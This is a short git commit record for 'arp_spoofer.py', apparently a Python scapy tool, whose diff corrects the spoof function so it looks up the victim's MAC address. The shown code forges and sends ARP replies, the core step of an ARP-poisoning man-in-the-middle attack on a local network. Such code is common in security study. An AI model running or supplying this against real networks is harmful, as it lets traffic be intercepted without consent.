ef6c4e5fa72eed011d331d456782481bb122d4cb
MashoodShabbir <75148937+MashoodShabbir@users.noreply.github.com>
2025-01-21 14:31:03 -0500

    Update arp_spoofer.py

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -23,7 +23,7 @@ def get_mac(ip):
     return answer_list[0][1].hwsrc
 
 def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(spoof_ip)
+    target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
